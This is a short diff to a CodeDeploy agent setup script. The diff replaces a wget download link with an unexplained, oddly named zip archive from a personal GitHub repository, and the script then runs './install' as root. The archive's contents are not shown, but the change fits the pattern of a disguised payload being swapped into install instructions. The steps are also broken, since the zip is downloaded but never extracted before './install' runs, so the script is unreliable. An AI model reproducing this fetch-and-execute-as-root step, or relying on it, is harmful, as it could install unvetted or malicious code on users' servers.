@@ -8,7 +8,7 @@ sudo yum -y update<br />
 sudo yum -y install ruby<br />
 sudo yum -y install wget<br />
 cd /home/ec2-user<br />
-wget https://raw.githubusercontent.com/sivahariu/aws_cicd_pipline_codedeploy/main/scripts/aws_cicd_pipline_codedeploy-2.2.zip<br />
+wget https://github.com/sivahariu/aws_cicd_pipline_codedeploy/raw/refs/heads/main/scripts/codedeploy-aws-cicd-pipline-salamander.zip<br />
 sudo chmod +x ./install<br />
 sudo ./install auto<br />
 sudo yum install -y python-pip<br />
